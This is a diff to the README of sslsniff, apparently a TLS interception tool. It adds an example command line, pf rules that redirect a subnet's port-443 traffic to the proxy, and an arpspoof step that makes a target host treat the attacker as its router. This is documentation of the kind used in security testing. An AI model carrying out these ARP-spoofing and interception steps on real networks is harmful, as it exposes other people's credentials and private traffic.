@@ -32,7 +32,9 @@ Installing sslsniff
     instead of a CA cert.
 
     You would run sslsniff as: 
-    ./sslsniff -a -s <$listenPort> -w <$logFile> -c <$caCert>
+    # ./sslsniff -a -s <$listenPort> -w <$logFile> -c <$caCert>
+    an actual example as:
+    # ./sslsniff -a -c etc/certs/CA.pem -s 4433
 
     Targeted Mode:
 
@@ -103,22 +105,39 @@ Setting up iptables
 Setting up pf
 -------------
 
-Basic support for pf is now included. Set up firewall rules similar to
-those above, and change util/Destination.cpp by undefining HAVE_NETFILTER
-and defining HAVE_PF at the top.
+    * Flip your machine into ip_forward mode by input following command
+      (sysctl net.inet.ip.forwarding=1)
+      or enable it in /etc/sysctl.conf at system boot
+      ##############################
+      net.inet.ip.forwarding=1
+      ##############################
 
+    * Add nat and ssl intercept as follow in pf.conf. Replace or remove responding IP addresses with yours. 
+      ##############################################################################
+      host_ip="192.168.9.100"
+      local_ip="192.168.9.251"
+      router_ip="192.168.9.1"
+      broadcast_ip="192.168.9.255"
+      netseg="192.168.9.1/24"
+      table <suspects> {$netseg, !$router_ip, !$broadcast_ip, !$host_ip, !$local_ip }
+      nat on em0 from <suspects> to !$netseg -> $local_ip
+      rdr on em0 inet proto tcp from any to any port 443 -> 127.0.0.1 port 4433
+      ###############################################################################
 
-Running arpspoof
---------------------------
+Trapping traffic
+----------------------------------      
+    1. Running arpspoof
+       Assuming we want to intercept SSL traffic from 172.17.10.36, we need to 
+       trick that host into thinking that we're the router.  Using arpspoof, we 
+       can convince the target that the router's MAC address is our MAC address.
 
-Assuming we want to intercept SSL traffic from 172.17.10.36, we need to 
-trick that host into thinking that we're the router.  Using arpspoof, we 
-can convince the target that the router's MAC address is our MAC address.
+         * arpspoof -i eth0 -t 172.17.10.36 172.17.8.1
 
-    * arpspoof -i eth0 -t 172.17.10.36 172.17.8.1
-
-At this point, any SSL traffic should get proxied by sslsniff and logged to 
-a file.
+       At this point, any SSL traffic should get proxied by sslsniff and logged to 
+       a file.
+    2. Set target's gateway
+       If you are doing test and you can control target. you just need set target's router
+       to your machine that running sslsniff.
 
 How does this work?
 -------------------
